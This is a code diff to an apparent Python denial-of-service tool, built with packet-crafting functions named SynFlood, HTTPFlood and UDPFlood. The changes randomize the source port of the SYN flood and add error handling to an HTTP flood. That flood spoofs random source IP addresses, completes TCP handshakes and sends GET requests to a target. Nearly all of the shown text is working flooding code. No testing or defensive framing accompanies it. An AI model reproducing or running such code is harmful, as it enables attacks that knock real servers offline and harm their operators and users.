@@ -61,6 +61,7 @@ def randomSrcIP():
 def randomPort():
     port = randint(0, 65535)
     return port
+
 def SynFlood(dstIP,dstPort,repeat):
     for x in range(int(repeat)):
         IP_Packet = IP()
@@ -68,7 +69,7 @@ def SynFlood(dstIP,dstPort,repeat):
         IP_Packet.dst = dstIP
 
         TCP_Packet = TCP()
-        TCP_Packet.sport = 80 # default port : 20
+        TCP_Packet.sport = randomPort() # default port : 20
         TCP_Packet.dport = dstPort
         TCP_Packet.flags = "S"
 
@@ -76,27 +77,30 @@ def SynFlood(dstIP,dstPort,repeat):
 
 def HTTPFlood(dstIP,dstPort,repeat):
     for x in range(repeat):
-        IP_Packet = IP()
-        IP_Packet.dst = dstIP
-        IP_Packet.src = randomSrcIP()
+        try:
+            IP_Packet = IP()
+            IP_Packet.dst = dstIP
+            IP_Packet.src = randomSrcIP()
 
-        TCP_Packet = TCP()
-        TCP_Packet.sport = randomPort()
-        TCP_Packet.dport = dstPort
-        TCP_Packet.flags="S"
-        
-        syn = IP_Packet/TCP_Packet
-        
-        packet_SynAck = sr1(syn,timeout=1)
+            TCP_Packet = TCP()
+            TCP_Packet.sport = randomPort()
+            TCP_Packet.dport = dstPort
+            TCP_Packet.flags="S"
+            
+            syn = IP_Packet/TCP_Packet
+            packet_SynAck = sr1(syn,timeout=1)
+            
+            if(packet_SynAck is None):
+                print("-"*35 + "ACK+SYN Packet is Filtered"+35*"-"+"\n")
+                continue
+            TCP_Packet.flags="A"
+            TCP_Packet.seq = packet_SynAck[TCP].ack
+            TCP_Packet.ack= packet_SynAck[TCP].seq+1
+            getStr='GET / HTTP/1.0\n\n'
 
-        if(packet_SynAck is None):
-            print("-"*35 + "ACK+SYN Packet is Filtered"+35*"-"+"\n")
-            continue
-        TCP_Packet.flags="A"
-        TCP_Packet.seq = packet_SynAck[TCP].ack
-        TCP_Packet.ack= packet_SynAck[TCP].seq+1
-        getStr='GET / HTTP/1.0\n\n'
-        send(IP_Packet/TCP_Packet/getStr)
+            send(IP_Packet/TCP_Packet/getStr)
+        except:
+            print("-"*35 + "Error Occured during Sending packets"+35*"-"+"\n")
 
 def UDPFlood(dstIP,dstPort,repeat):
     for x in range(repeat):
